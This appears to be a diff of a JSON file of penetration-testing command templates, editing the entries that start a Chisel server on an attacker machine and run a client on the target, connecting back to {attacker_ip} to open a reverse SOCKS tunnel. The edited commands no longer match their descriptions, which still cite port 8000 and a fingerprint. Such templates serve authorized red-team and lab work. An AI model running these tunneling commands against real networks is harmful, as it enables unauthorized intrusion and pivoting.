@@ -4,12 +4,12 @@
   "commands": [
     {
       "title": "Start Chisel Server on Attacker",
-      "template": "chisel server --port 8000 --socks5 --reverse",
+      "template": "chisel server --port 6666 --reverse",
       "description": "Start Chisel server in reverse mode with SOCKS5 proxy enabled on port 8000."
     },
     {
       "title": "Run Chisel Client on Target",
-      "template": "./chisel client --fingerprint {fingerprint} {attacker_ip}:8000 R:socks",
+      "template": "./chisel.exe client  {attacker_ip}:6666 R:1080:socks",
       "description": "Connect the Chisel client from the target to the attacker. Replace {fingerprint} with server fingerprint and {attacker_ip} with your attack machine IP."
     },
     {
